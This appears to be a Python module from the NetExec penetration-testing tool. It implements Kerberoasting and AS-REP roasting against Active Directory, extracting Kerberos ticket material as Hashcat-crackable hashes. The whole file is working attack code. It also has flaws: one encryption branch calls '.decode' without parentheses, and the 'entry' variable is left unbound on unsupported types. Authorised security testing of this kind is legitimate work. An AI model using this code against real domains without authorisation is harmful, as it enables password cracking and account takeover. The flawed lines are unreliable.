import random
from binascii import hexlify, unhexlify
from datetime import datetime, timedelta
import traceback
try:
    # This is only available in python >= 3.11
    # if we are in a lower version, we will use the deprecated utcnow() method
    from datetime import UTC
    utc_failed = False
except ImportError:
    utc_failed = True
from os import getenv

from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REQ, AS_REP, KERB_PA_PAC_REQUEST, KRB_ERROR, seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT
from impacket.krb5.types import KerberosTime, Principal
from impacket.ntlm import compute_lmhash, compute_nthash
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from nxc.logger import nxc_logger


class KerberosAttacks:
    def __init__(self, connection):
        self.username = connection.username
        self.password = connection.password
        self.domain = connection.domain
        self.targetDomain = connection.targetDomain
        self.hash = connection.hash
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = connection.aesKey
        self.kdcHost = connection.kdcHost
        self.kerberos = connection.kerberos

        if self.hash is not None:
            if self.hash.find(":") != -1:
                self.lmhash, self.nthash = self.hash.split(":")
            else:
                self.nthash = self.hash

        if self.password is None:
            self.password = ""

    def output_tgs(self, tgs, old_session_key, session_key, username, spn, fd=None):
        decoded_tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
        # ticket
        if decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.rc4_hmac.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.rc4_hmac.value,
                username,
                decoded_tgs["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
            )
        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                username,
                decoded_tgs["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode,
            )
        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                username,
                decoded_tgs["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode(),
            )
        elif decoded_tgs["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.des_cbc_md5.value,
                username,
                decoded_tgs["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
                hexlify(decoded_tgs["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
            )
        else:
            nxc_logger.error(f"Skipping {decoded_tgs['ticket']['sname']['name-string'][0]}/{decoded_tgs['ticket']['sname']['name-string'][1]} due to incompatible e-type {decoded_tgs['ticket']['enc-part']['etype']:d}")

        return entry

    def get_tgt_kerberoasting(self, kcache=None):
        if kcache:
            if getenv("KRB5CCNAME"):
                nxc_logger.debug("KRB5CCNAME environment variable exists, attempting to use that...")
                try:
                    ccache = CCache.loadFile(getenv("KRB5CCNAME"))
                    # retrieve user and domain information from CCache file if needed
                    domain = ccache.principal.realm["data"] if self.domain == "" else self.domain
                    nxc_logger.debug(f"Using Kerberos Cache: {getenv('KRB5CCNAME')}")
                    principal = f"krbtgt/{domain.upper()}@{domain.upper()}"
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        tgt = creds.toTGT()
                        nxc_logger.debug("Using TGT from cache")
                        return tgt
                    else:
                        nxc_logger.debug("No valid credentials found in cache")
                except Exception:
                    pass
            else:
                nxc_logger.fail("KRB5CCNAME environment variable not found, unable to use Kerberos Cache")

        # No TGT in cache, request it
        user_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.password != "" and (self.lmhash == "" and self.nthash == ""):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    user_name,
                    "",
                    self.domain,
                    compute_lmhash(self.password),
                    compute_nthash(self.password),
                    self.aesKey,
                    kdcHost=self.kdcHost,
                )
            except OSError as e:
                if e.errno == 113:
                    nxc_logger.fail(f"Unable to resolve KDC hostname: {e!s}")
                else:
                    nxc_logger.fail(f"Some other OSError occured: {e!s}")
                return None
            except Exception as e:
                nxc_logger.debug(f"TGT: {e!s}")
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    user_name,
                    self.password,
                    self.domain,
                    unhexlify(self.lmhash),
                    unhexlify(self.nthash),
                    self.aesKey,
                    kdcHost=self.kdcHost,
                )
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                user_name,
                self.password,
                self.domain,
                unhexlify(self.lmhash),
                unhexlify(self.nthash),
                self.aesKey,
                kdcHost=self.kdcHost,
            )
        tgt_data = {}
        tgt_data["KDC_REP"] = tgt
        tgt_data["cipher"] = cipher
        tgt_data["sessionKey"] = sessionKey
        nxc_logger.debug(f"Final TGT: {tgt_data}")
        return tgt_data

    def get_tgt_asroast(self, userName, requestPAC=True):
        client_name = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        as_req = AS_REQ()

        domain = self.targetDomain.upper()
        server_name = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pac_request = KERB_PA_PAC_REQUEST()
        pac_request["include-pac"] = requestPAC
        encoded_pac_request = encoder.encode(pac_request)

        as_req["pvno"] = 5
        as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        as_req["padata"] = noValue
        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        as_req["padata"][0]["padata-value"] = encoded_pac_request

        req_body = seq_set(as_req, "req-body")

        opts = []
        opts.extend((constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value))
        req_body["kdc-options"] = constants.encodeFlags(opts)

        seq_set(req_body, "sname", server_name.components_to_asn1)
        seq_set(req_body, "cname", client_name.components_to_asn1)

        if domain == "":
            nxc_logger.error("Empty Domain not allowed in Kerberos")
            return None

        req_body["realm"] = domain
        # When we drop python 3.10 support utcnow() can be removed, as it is deprecated
        now = datetime.utcnow() + timedelta(days=1) if utc_failed else datetime.now(UTC) + timedelta(days=1)
        req_body["till"] = KerberosTime.to_asn1(now)
        req_body["rtime"] = KerberosTime.to_asn1(now)
        req_body["nonce"] = random.getrandbits(31)

        supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(req_body, "etype", supported_ciphers)

        message = encoder.encode(as_req)

        try:
            r = sendReceive(message, domain, self.kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supported_ciphers = (
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                )
                seq_set_iter(req_body, "etype", supported_ciphers)
                message = encoder.encode(as_req)
                r = sendReceive(message, domain, self.kdcHost)
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
                return f"Password of user {userName} expired but user doesn't require pre-auth"
            else:
                nxc_logger.fail(e)
                nxc_logger.debug(traceback.format_exc())
                return None

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            as_rep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except Exception:
            # Most of the times we shouldn't be here, is this a TGT?
            as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            nxc_logger.debug(f"User {userName} doesn't have UF_DONT_REQUIRE_PREAUTH set")
            return None

        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        hash_tgt = f"$krb5asrep${as_rep['enc-part']['etype']}${client_name}@{domain}:"
        if as_rep["enc-part"]["etype"] in (17, 18):
            hash_tgt += f"{hexlify(as_rep['enc-part']['cipher'].asOctets()[:12]).decode()}${hexlify(as_rep['enc-part']['cipher'].asOctets()[12:]).decode()}"
        else:
            hash_tgt += f"{hexlify(as_rep['enc-part']['cipher'].asOctets()[:16]).decode()}${hexlify(as_rep['enc-part']['cipher'].asOctets()[16:]).decode()}"
        return hash_tgt
